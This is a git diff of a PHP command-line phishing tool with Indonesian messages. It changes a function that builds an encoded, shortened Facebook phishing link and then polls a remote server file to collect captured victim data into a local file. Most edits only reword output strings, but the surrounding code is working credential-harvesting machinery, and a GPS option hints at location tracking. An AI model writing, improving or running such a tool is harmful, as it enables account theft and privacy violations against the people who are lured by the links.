@@ -103,17 +103,17 @@ function buat_phising($opsi, $random, $url)
 {	
 	sleep(1);
 	$urls = base64_encode($url."welcome.php?opsi=".base64_encode($opsi)."&q=".$random);
-	echo "\n[+] Link Ready : > ";
+	echo "\n[+] Tautan ditemukan : > ";
 	short_dom($urls);
 	// litening
-	echo "\n\n[+] Listening Target < ";
+	echo "\n\n[+] Menunggu.. ";
 	$a = 1;$z=1;
 	for ($a; $a < 9999; $a++) { 
 		
 		$cek = get_headers($url."phising/phising_".$random.".txt");
 		// listen
 		if (!preg_match("/200/", $cek[0])) {
-			echo "=";
+			echo "%";
 		}else{
 			$ambil = file_get_contents($url."phising/phising_".$random.".txt");
 			
@@ -127,8 +127,7 @@ function buat_phising($opsi, $random, $url)
 				$q = count($o[0]);
 				$r = $q + 1;
 
-				echo " >\n[+] ". $r ." Target Di Dapatkan !\n";
-				echo "[+] Membuat File\n\n";
+				echo "\n[+] ". $r ." Target Di temukan.\n";
 				$filesss = "phising_".$random.".txt";
 				
 				$o = fopen($filesss, 'a');
@@ -269,14 +268,14 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 
 }elseif($pilih == '--PHISING' || $pilih == '--phising'){
 	
-	echo "\n(1). Facebook \n[+] Masih di Update Gan !!!";
+	echo "\n(1). Facebook";
 
-	echo "\n\n Masukan Pilihan : > ";
+	echo "\n\n pilih nomor : > ";
 	$opsi = trim(fgets(STDIN));
 
 	if ($opsi == 1) {
 		// FB
-		echo "\n\n[+] Your ID : " . $random . "\n[+] Created Link : Loading ...";
+		echo "\n\n[+] ID antum : " . $random . "\n[+] Membuat Tautan ...";
 		buat_phising($opsi, $random, $url);
 	}
 
